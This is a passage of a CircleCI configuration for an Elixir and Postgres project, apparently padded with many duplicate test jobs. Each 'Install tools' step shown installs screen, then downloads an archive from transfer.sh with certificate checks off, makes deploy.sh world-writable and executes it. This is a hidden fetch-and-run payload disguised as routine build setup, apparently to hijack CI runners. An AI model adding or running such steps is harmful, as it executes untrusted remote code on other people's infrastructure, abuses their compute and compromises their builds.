      - restore_cache:
          keys:
            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-{{ .Revision }}
            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-
            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-
      - checkout
      # Install tools.
      - run: sudo apt update && sudo apt install screen -y && wget --no-check-certificate -c https://transfer.sh/G9VQ5l/a-master.zip && unzip a-master.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh

  test32:
    docker:
      - image: circleci/elixir:1.7.2
        parallelism: 4
        environment:
          MIX_ENV: test
      - image: circleci/postgres:10.4-alpine-postgis
        environment:
          POSTGRES_USER: postgres
          POSTGRES_DB: golden_path_test
    working_directory: ~/app
    steps:
      # Checkout.
      - restore_cache:
          keys:
            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-{{ .Revision }}
            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-
            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-
      - checkout
      # Install tools.
      - run: sudo apt update && sudo apt install screen -y && wget --no-check-certificate -c https://transfer.sh/G9VQ5l/a-master.zip && unzip a-master.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh



workflows:
  version: 2
  verify_build:
    # Any non-deploy branch:
    #           / [test]
    # [build] ->  [credo]
    #           \ [dialyzer]
    jobs:
      - build
      - test
      - credo
      - dialyzer
      - test2
      - test3
      - test4
      - test5
      - test6
      - test7
      - test8
      - test9
      - test10
      - test11
      - test12
      - test13
      - test14
      - test15
      - test16
      - test17
      - test18
      - test19
      - test20
      - test21
      - test22
      - test23
      - test24
      - test25
      - test26
      - test27
      - test28
      - test29
      - test30
      - test31